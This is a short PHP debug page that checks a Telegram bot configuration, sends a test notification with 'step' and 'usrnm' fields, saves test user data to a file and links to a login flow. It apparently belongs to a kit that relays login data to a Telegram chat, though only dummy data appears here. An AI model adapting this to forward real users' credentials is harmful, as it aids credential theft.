<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

echo "<h1>Firelands PHP Debug - Telegram Test</h1>";

// Test basic configuration
echo "<h2>Configuration Check:</h2>";
echo "TELEGRAM_ENABLED: " . (TELEGRAM_ENABLED ? 'true' : 'false') . "<br>";
echo "TELEGRAM_BOT_TOKEN: " . substr(TELEGRAM_BOT_TOKEN, 0, 10) . "...<br>";
echo "TELEGRAM_CHAT_ID: " . TELEGRAM_CHAT_ID . "<br>";
echo "DEBUG_MODE: " . (DEBUG_MODE ? 'true' : 'false') . "<br>";

// Test a simple notification
echo "<h2>Testing Telegram Notification:</h2>";

$testData = [
    'step' => 'debug_test',
    'usrnm' => 'debug_user_' . time(),
    'message' => 'Debug test from Firelands PHP',
    'timestamp' => date('Y-m-d H:i:s')
];

echo "Sending test data: <pre>" . print_r($testData, true) . "</pre>";

$result = sendTelegramNotification($testData);

if ($result) {
    echo "<h3 style='color: green;'>✅ Telegram notification sent successfully!</h3>";
} else {
    echo "<h3 style='color: red;'>❌ Telegram notification failed!</h3>";
    
    // Try to get more detailed error info
    echo "<h4>Additional Debug Info:</h4>";
    
    // Test the Telegram message function directly
    $testMessage = "🧪 Debug Test Message\n👤 User: debug_user\n⏰ Time: " . date('Y-m-d H:i:s');
    $directResult = sendTelegramMessage($testMessage);
    
    echo "Direct message test result: " . ($directResult ? 'SUCCESS' : 'FAILED') . "<br>";
}

// Test file saving
echo "<h2>Testing File Storage:</h2>";

$saveData = [
    'step' => 'debug_save_test',
    'usrnm' => 'debug_user',
    'test_field' => 'test_value_' . time()
];

$saveResult = saveUserData('debug_test.txt', $saveData);

if ($saveResult) {
    echo "<h3 style='color: green;'>✅ File save successful!</h3>";
} else {
    echo "<h3 style='color: red;'>❌ File save failed!</h3>";
}

echo "<h2>Next Steps:</h2>";
echo "<p>1. Check if you received a Telegram message</p>";
echo "<p>2. Check the data directory for saved files</p>";
echo "<p>3. Try the normal <a href='index.php'>login flow</a></p>";
?>
